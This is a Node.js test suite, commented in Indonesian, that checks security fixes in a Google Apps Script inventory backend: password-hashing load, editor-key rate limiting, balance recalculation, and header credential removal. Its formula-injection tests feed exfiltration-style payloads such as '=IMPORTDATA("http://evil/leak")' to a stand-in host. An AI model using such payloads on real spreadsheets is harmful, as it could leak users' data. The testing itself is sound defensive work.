/* L1 gs_hardening_exec — RED→GREEN untuk 5 temuan backend yang sebelumnya hanya
 * dicatat sebagai "ACCEPTED LIMITATION" di sec_classify.js. Suite ini MENGEKSEKUSI
 * Code.gs lewat harness dan membuktikan sifatnya, bukan grep.
 *
 *   BE-01  KDF 5.000 iterasi ikut jalan untuk request TANPA kredensial (DoS amplifier)
 *   BE-02  tidak ada rate limit untuk editor key (brute force tanpa batas)
 *   BE-04  recalculateAllSaldo memakai clearContents → pembaca bisa lihat saldo kosong
 *   BE-05  formula-injection guard (safeCell_) tidak dipakai di jalur tulis modul Aset
 *   BE-07  jalur kredensial via header DIHAPUS (L3 membuktikan tak pernah sampai: SEC-06)
 *
 * Semua test menulis property yang SEHARUSNYA benar.Sebelum fix: FAIL (RED).
 * Level: L1 (offline deterministik, harness in-memory). */
const fs = require('fs');
const path = require('path');
const { loadCodeGS, makeSpreadsheet, makeSheet } = require('../tools/gs_harness.js');

let pass = 0, fail = 0;
function t(name, cond, detail) {
  if (cond) { pass++; console.log('PASS | ' + name + (detail ? ' | ' + detail : '')); }
  else { fail++; console.log('FAIL | ' + name + (detail ? ' | ' + detail : '')); }
}
const EDITOR_KEY = 'RAHASIA-EDITOR-KEY';

function kitchen(editorRows) {
  return makeSpreadsheet([
    makeSheet('Master_Item', [['No', 'ID_Item', 'Nama Material', 'Spesifikasi', 'User/Dept', 'BC/Non BC', 'Unit', 'Kategori', 'Min_Stock', 'Status'], [1, 'MRO-01', 'Bearing', 'Spec', 'Gudang', 'BC', 'Pcs', 'Sparepart', 5, 'Aktif']]),
    makeSheet('Transaksi_Log', [['Timestamp', 'ID_Item', 'Nama_Item', 'Spesifikasi', 'Jenis', 'Qty', 'RAK', 'Vendor', 'No_Referensi', 'Saldo_Sebelum', 'Saldo_Sesudah', 'Keterangan', 'Admin']]),
    makeSheet('Stok_Saldo', [['ID_Item', 'Nama', 'Unit', 'Total_Masuk', 'Total_Keluar', 'Saldo_Akhir']]),
    makeSheet('Stok_Per_Rak', [['ID_Item', 'RAK', 'Qty']]),
    /* Sheet Editor_Accounts DIHAPUS 2026-09-28 (bersama checkEditorAccountKey_ dan
       checkEditorKey). Tidak ada lagi kode yang membacanya, jadi tidak perlu lagi
       dibuat di kitchen test ini. */
    makeSheet('Aset_Item', [['No', 'Kode_Alat', 'Nama_Alat', 'Brand', 'Cutting_Tool', 'Material', 'Spesifikasi', 'Mesin_Default', 'Kode_Mesin_Default', 'Berat_Kg', 'UOM', 'Rak_Penyimpanan', 'Vendor_Asah_Default', 'Rata2_Pemakaian_30Hari', 'Lead_Time_Asah_RatRata', 'Safety_Stock', 'Reorder_Point', 'Min_Stock']]),
    makeSheet('Aset_Unit', [['Unit_ID', 'Kode_Alat', 'Tanggal_Masuk', 'Regrind_Count', 'Status_Unit', 'Lokasi_Saat_Ini', 'Kode_Mesin_Saat_Ini', 'Last_Event', 'Last_Cycle_ID', 'Last_Update']]),
    makeSheet('Aset_Movement_Log', [['Timestamp', 'Kode_Alat', 'Unit_ID', 'ID_Transaksi', 'Activity', 'Qty', 'Cycle_ID', 'Counter', 'Kode_Mesin', 'Vendor', 'PIC', 'Keterangan']]),
    makeSheet('Master_Kategori', [['Kategori']]),
    makeSheet('Master_UOM', [['UOM']]),
    makeSheet('Master_Vendor', [['Vendor']]),
    makeSheet('Master_Rak', [['Rak']]),
  ]);
}
function ctxFor(kit, kdf) {
  return loadCodeGS({ spreadsheet: kit, kdfIterations: kdf || 100, props: { EDITOR_KEY: EDITOR_KEY, VIEWER_TOKEN_SECRET: 'S' } });
}
// hitung berapa kali KDF (verifyPasswordHash_) dijalankan — DILAKUKAN untuk membuktikan BE-01.
// Hanya bungkus entry point KDF; jangan bungkus hashPasswordHex_ (mem riddled recursion).
function countKdfCalls(ctx) {
  const orig = ctx.verifyPasswordHash_;
  let n = 0;
  ctx.verifyPasswordHash_ = function () { n++; return orig.apply(this, arguments); };
  return () => n;
}

/* ================= BE-01: KDF jalan tanpa kredensial ================= */
(function () {
  const ctx0 = ctxFor(kitchen([['Admin', ctxFor(kitchen()).makeSaltedPasswordHash_('editor-pass-1'), true], ['Admin2', ctxFor(kitchen()).makeSaltedPasswordHash_('editor-pass-2'), true]]));
  const kit = kitchen([['Admin', ctx0.makeSaltedPasswordHash_('editor-pass-1'), true], ['Admin2', ctx0.makeSaltedPasswordHash_('editor-pass-2'), true]]);
  const ctx = ctxFor(kit);
  const c = countKdfCalls(ctx);
  // request baca TANPA kredensial (skenario viewer/anonim) — tidak seharusnya hashing sama sekali
  const res = ctx.checkAnyAccess({});
  const n = c();
  t('BE-01: request baca tanpa kredensial TIDAK menjalankan KDF password', n === 0, 'KDF dijalankan ' + n + '× untuk 1 request tanpa kredensial');
  // sanity: dengan editorKey salah → memang harus hashing (membandingkan)
  const ctx2 = ctxFor(kitchen([['Admin', ctx0.makeSaltedPasswordHash_('editor-pass-1'), true]]));
  const c2 = countKdfCalls(ctx2);
  ctx2.checkAnyAccess({ editorKey: 'SALAH-SEKALI' });
  /* F5-AUTH (2026-09-27): invarian ini BERUBAH secara sengaja. Kunci tunggal sekarang
   * break-glass yang DEFAULT MATI, jadi kunci yang salah ditolak tanpa perlu hashing
   * sama sekali (tidak ada kunci untuk dibandingkan). Yang harus dijaga: (a) jalur
   * legacy tetap memakai perbandingan constant-time + rate limit, dan (b) token
   * ditolak lewat HMAC, bukan perbandingan plaintext. */
  t('BE-01b: kunci salah DITOLAK tanpa hashing (legacy mati by default)', c2() === 0,
    'KDF ' + c2() + '× & hasil=' + JSON.stringify(ctx2.checkAnyAccess({ editorKey: 'SALAH-SEKALI' })).slice(0, 90));
})();

/* ================= BE-02: rate limit editor key ================= */
(function () {
  // mode 1: satu kunci salah diulang-ulang (hammer satu target)
  const ctx = ctxFor(kitchen([])); // tanpa Editor_Accounts → jatuh ke EDITOR_KEY tunggal
  let rejectedAt = -1;
  for (let i = 1; i <= 20; i++) {
    const r = ctx.checkLegacySingleKey_('TEBAKAN-SAMA');
    if (r && r.ok === false && /terlalu banyak|limit|banyak percobaan/i.test(r.message || '')) { rejectedAt = i; break; }
  }
  t('BE-02a: kunci salah yang diulang dihentikan (rate limit per-kunci)', rejectedAt > 0,
    rejectedAt > 0 ? 'ditolak pada percobaan ke-' + rejectedAt : 'TIDAK ADA rate limit');

  // mode 2: tebukan ACAK (setiap kunci berbeda) — inilah brute force sungguhan,
  // harus dihentikan oleh penghitung GLOBAL (per-kunci saja tidak cukup)
  const ctx2 = ctxFor(kitchen([]));
  let rejectedAt2 = -1;
  for (let i = 1; i <= 60; i++) {
    const r = ctx2.checkLegacySingleKey_('ACAK-' + i + '-' + Math.random());
    if (r && r.ok === false && /terlalu banyak|limit|banyak percobaan/i.test(r.message || '')) { rejectedAt2 = i; break; }
  }
  t('BE-02b: tebakan acak dihentikan (rate limit global)', rejectedAt2 > 0,
    rejectedAt2 > 0 ? 'dihentikan setelah ' + rejectedAt2 + ' tebakan' : 'TIDAK ADA rate limit global');
})();

(function () {
  const ctx = ctxFor(kitchen([]));
  for (let i = 0; i < 5; i++) ctx.checkLegacySingleKey_('SALAH-SEKALI');
  t('BE-02c: editor key benar tetap bisa dipakai setelah ada percobaan salah',
    ctx.checkLegacySingleKey_(EDITOR_KEY).ok === true, 'kunci sah tetap valid');
})();

/* ================= BE-04: recalc tidak boleh mengosongkan sheet ================= */
(function () {
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 10, rak: 'A-01', admin: 'b', requestId: 'h1' });
  ctx.postTransaksi({ itemId: 'MRO-01', jenis: 'MASUK', qty: 7, rak: 'B-01', admin: 'b', requestId: 'h2' });
  // intsruksi: catat setiap panggilan clearContents pada sheet saldo
  const calls = [];
  ['Stok_Saldo', 'Stok_Per_Rak'].forEach(name => {
    const sh = kit.getSheetByName(name);
    const orig = sh.clearContents;
    sh.clearContents = function () { calls.push(name); return orig.apply(this, arguments); };
  });
  ctx.recalculateAllSaldoLocked_();
  t('BE-04: kalkulasi ulang TIDAK mengosongkan sheet saldo (reader tak pernah lihat kosong)', calls.length === 0,
    calls.length ? 'clearContents dipanggil pada: ' + calls.join(',') : 'tidak ada clearContents');
  const saldo = kit.getSheetByName('Stok_Saldo').getRange(2, 1, kit.getSheetByName('Stok_Saldo').getLastRow() - 1, 6).getValues();
  t('BE-04b: hasil kalkulasi tetap benar (MRO-01 = 17)', saldo.length === 1 && Number(saldo[0][5]) === 17, JSON.stringify(saldo));
})();

/* ================= BE-05: formula guard di jalur tulis Aset ================= */
(function () {
  const ctx0 = ctxFor(kitchen([]));
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  ctx.addAsetItem({ kodeAlat: 'PAHAT-01', namaAlat: '=IMPORTDATA("http://evil/leak")', pic: 'budi' });
  ctx.addMasterValue({ type: 'kategori', value: '=IMPORTDATA("http://evil/leak2")' });
  const itemName = (kit.getSheetByName('Aset_Item').getRange(2, 3, 1, 1).getValues()[0] || [])[0];
  const kat = (kit.getSheetByName('Master_Kategori').getRange(2, 1, 1, 1).getValues()[0] || [])[0];
  t('BE-05: namaAlat berawalan "=" dinetralkan (prefix kutip)', typeof itemName === 'string' && itemName.charAt(0) === "'", JSON.stringify(itemName));
  t('BE-05b: addMasterValue berawalan "=" dinetralkan', typeof kat === 'string' && kat.charAt(0) === "'", JSON.stringify(kat));
  // unit + movement log juga harus terlindungi
  ctx.addAsetUnit({ kodeAlat: 'PAHAT-01', jumlah: 1, pic: 'b' });
  const unitId = kit.getSheetByName('Aset_Unit').getRange(2, 1, 1, 1).getValues()[0][0];
  ctx.recordAsetMovement({ unitId: unitId, activity: 'DIPASANG_KE_MESIN', pic: 'b', kodeMesin: '=CMD()' });
  const log = kit.getSheetByName('Aset_Movement_Log').getRange(2, 1, kit.getSheetByName('Aset_Movement_Log').getLastRow() - 1, 12).getValues();
  const kodeMesin = log[log.length - 1][8];
  t('BE-05c: kodeMesin berawalan "=" di movement log dinetralkan', typeof kodeMesin === 'string' && kodeMesin.charAt(0) === "'", JSON.stringify(kodeMesin));
})();

/* ================= BE-07 (DIPERBARUI 2026-09-27): jalur header DIHAPUS =================
 * Bukti L3 (tests/tools/l3_cred_probe.js): `X-Editor-Key` (huruf besar) maupun
 * `x-editor-key` (huruf kecil) KEDUA-DUANYA ditolak di produksi, sementara `editorKey` di
 * body LIHAT DATA. Apps Script web app tidak mengekspos custom request header ke
 * e.allHeaders/e.postData.headers, jadi pembaca header adalah DEAD CODE — yang pernah
 * "diperbaiki" (BE-07) tidak pernah memberi perlindungan apa pun.
 * Keputusan: hapus pembaca header supaya tidak ada rasa aman semu. Kredensial hanya lewat
 * body POST (client sudah begitu) — bukan query string, bukan header. */
(function () {
  const src = fs.readFileSync(path.join(__dirname, '..', '..', 'Code.gs'), 'utf8');
  // Yang diperiksa adalah kode EKSEKUTABEL (assignment dari header), bukan komentar dokumentasi.
  const executable = src.split('\n').filter(l => !/^\s*(\*|\/\/|\/\*)/.test(l)).join('\n');
  t('BE-07a: tidak ada lagi ASSIGNMENT kredensial dari header di Code.gs',
    !/=\s*headers\s*\[/.test(executable) && !/allHeaders/.test(executable),
    'sisa assignment header di kode: ' + ((executable.match(/headers\s*\[/g) || []).length));
  t('BE-07b: kredensial TIDAK lagi ditulis ke query string di frontend',
    !/[?&](editorKey|viewerToken|authToken)=/.test(fs.readFileSync(path.join(__dirname, '..', '..', 'index.html'), 'utf8')),
    'frontend tidak menyisipkan kredensial ke URL');
  t('BE-07c: token tetap dibawa di body POST (satu-satunya jalur yang terbukti bekerja)',
    /body\.editorKey|params\.editorKey/.test(fs.readFileSync(path.join(__dirname, '..', '..', 'js', 'outbox.js'), 'utf8')));
})();

/* ================= healthCheck (L3 deploy verification) ================= */
(function () {
  const gsSrc = fs.readFileSync(path.join(__dirname, '..', '..', 'Code.gs'), 'utf8');
  t('HC-1: API_VERSION dinaikkan & ada di source', /var API_VERSION\s*=\s*'v5\.\d+'/.test(gsSrc),
    (gsSrc.match(/var API_VERSION\s*=\s*'([^']+)'/) || [])[1] || '-');
  const postIdx = gsSrc.indexOf('function doPost');
  const hcPost = gsSrc.indexOf("action === 'healthCheck'", postIdx);
  const gateIdx = gsSrc.indexOf('checkAnyAccess', postIdx);
  t('HC-2: healthCheck di doPost SEBELUM gate auth (verifikasi versi tanpa login)', hcPost > 0 && hcPost < gateIdx,
    'idx healthCheck=' + hcPost + ' < idx gate=' + gateIdx);
  t('HC-3: healthCheck juga tersedia via doGet (GET tanpa POST)', gsSrc.indexOf('function doGet') < gsSrc.indexOf("action === 'healthCheck'", gsSrc.indexOf('function doGet')));

  // eksekusi nyata: tanpa kredensial, tanpa akses sheet
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  let out = null, threw = null;
  try { out = ctx.doPost({ postData: { contents: JSON.stringify({ action: 'healthCheck' }) } }); } catch (e) { threw = e.message; }
  let parsed = null, raw = null;
  try { raw = (out && typeof out.getContent === 'function') ? out.getContent() : (out && out._t) || ''; } catch (e) { raw = ''; }
  try { parsed = JSON.parse(raw || '{}'); } catch (e) { parsed = null; }
  t('HC-4: doPost healthCheck tanpa kredensial → 200 + versi (tidak 401/needLogin)', parsed && parsed.status === 'ok' && !!parsed.version,
    parsed ? JSON.stringify(parsed) : ('error=' + (threw || 'raw=' + String(raw).slice(0, 120))));
  t('HC-5: healthCheck tidak membocorkan data (tidak ada rows/items/saldo)', parsed && parsed.rows === undefined && parsed.items === undefined && parsed.data === undefined,
    Object.keys(parsed || {}).join(','));
  const before = kit.getSheetByName('Stok_Saldo').getLastRow();
  try { ctx.doGet({ parameter: { action: 'healthCheck' }, allHeaders: {} }); } catch (e) {}
  t('HC-6: healthCheck tidak mengubah sheet apa pun', kit.getSheetByName('Stok_Saldo').getLastRow() === before, 'lastRow=' + before);
})();

/* ================= BE-02b: traffic viewer TIDAK boleh mengunci editor =================
 * BUG DITEMUKAN SAAT PRE-DEPLOY CHECK (2026-09-27): `editorKeyRateFail_` menaikkan
 * penghitung GLOBAL untuk SEMUA kegagalan, termasuk ketika editorKey kosong.
 * Padahal `editorKeyRateBlocked_` hanya dipanggil kalau editorKey tidak kosong
 * (baris 541: `if (editorKey && editorKeyRateBlocked_(editorKey))`).
 * Akibatnya: 30 request viewer biasa (editorKey = '') dalam 10 menit -> global = 30
 * -> SEMUA editor terkunci "Terlalu banyak percobaan akses editor" sampai window habis.
 * Itu self-DoS: bisa dipicu siapa pun yang匿名 simplement membuka app, cukup reload.
 * Perbaikan: kegagalan dengan key KOSONG tidak dihitung sama sekali.
 * Keamanan tetap utuh: key kosong tidak mungkin dicocokkan dengan EDITOR_KEY
 * (constantTimeEquals_ dengan string kosong ≠ key asli), jadi tidak ada nilai brute force
 * yang hilang dengan tidak menghitungnya. */
(function () {
  const kit = kitchen([]);
  const ctx = ctxFor(kit);
  // panggil lewat jalur HIDUP yang sama dengan produksi: checkLegacySingleKey_
  // (dulu: checkEditorKey, yang sudah dihapus karena nol call site)

  // 40 request viewer/anonim: editorKey kosong
  for (let i = 0; i < 40; i++) {
    const r = ctx.checkLegacySingleKey_('');
    if (r.ok) { t('BE-02b-0: editorKey kosong tidak pernah diterima', false, JSON.stringify(r)); return; }
  }
  t('BE-02b-1: 40 request anonim (editorKey kosong) semuanya ditolak', true);

  // penghitung global harus tetap 0 - inilah invariant yang diawasi langsung
  const gcache = ctx.CacheService.getScriptCache();
  const gval = parseInt(gcache.get('editor_fail_global') || '0', 10);
  t('BE-02b-2: penghitung GLOBAL tetap 0 setelah 40 request anonim', gval === 0, 'editor_fail_global=' + gval);

  // editor sah mencoba -> tidak boleh dapat pesan rate limit
  const okRes = ctx.checkLegacySingleKey_('RAHASIA-EDITOR-YANG-BENAR');
  const msg = okRes.message || '';
  t('BE-02b-3: editor sah TIDAK dikunci rate limit oleh traffic anonim',
    okRes.ok === false && !/Terlalu banyak percobaan akses editor/.test(msg),
    'pesan=' + msg.slice(0, 90));

  // dan tebakan acak dengan key NYATA tetap dihentikan (tidak melempar proteksi)
  let blockedAt = -1;
  for (let i = 1; i <= 40; i++) {
    const r = ctx.checkLegacySingleKey_('tebakan-acak-' + i);
    if (/Terlalu banyak percobaan/.test(r.message || '')) { blockedAt = i; break; }
  }
  t('BE-02b-4: tebasan acak dengan key terisi tetap dibatasi (proteksi tidak hilang)', blockedAt > 0, 'diblokir pada tebakan ke-' + blockedAt);
})();

console.log('---- gs_hardening_exec: ' + pass + ' PASS / ' + fail + ' FAIL ----');
process.exit(fail ? 1 : 0);
